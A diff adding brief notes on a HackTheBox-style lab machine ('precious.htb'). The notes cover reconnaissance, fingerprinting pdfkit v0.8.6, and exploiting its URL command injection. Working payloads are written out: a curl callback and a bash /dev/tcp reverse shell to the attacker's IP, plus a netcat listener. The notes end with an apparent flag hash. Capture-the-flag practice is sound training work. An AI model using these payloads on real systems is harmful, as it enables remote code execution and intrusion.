@@ -1,0 +1,45 @@
+mac_ip = 10.10.11.189
+nmap -A 10.10.11.189 -oN nmap_result.txt
+
+
+sudo nano /etc/hosts
+Add ip-address in that files :- 10.10.11.189  precious.htb
+
+
+Open browser that Ip :- We see that page ask for entering URL to download content
+
+
+We add our ip in localhost so run python server to get request :-
+sudo python3 -m http.server 8080
+
+
+Now add our localmachine ip to test our webserver :- 
+ ifconfig -> add that ip in precious.htb page 
+ 
+ http://10.10.16.12
+ 
+ - it download our directory listing in webserver in PDF format
+ 
+ 
+Get this downloaded pdf metadata :-
+ - we found that it was created by pdfkit v0.8.6
+ - so now check this version and find any vulnerabilites
+
+ PDFKit vulnerable to Command Injection :- https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+ - it score is 7.3
+ - where the URL is not properly sanitized.
+ 
+ 
+ Exploit check  :- http://example.com/?name=#{'%20 `curl -XGET 10.10.16.12`'}
+ 
+ 
+ TO get Reverse Shell :- 
+  - Start listner on port 1337 :- nc -nvlp 1337
+  - http://example.com/?name=#{' `bash -c "bash -i >& /dev/tcp/10.10.16.12/1337 0>&1"`'}
+  
+  
+ dfe29f3e2671f84cf83dc1da8b651947
+
+
+ 
+ 
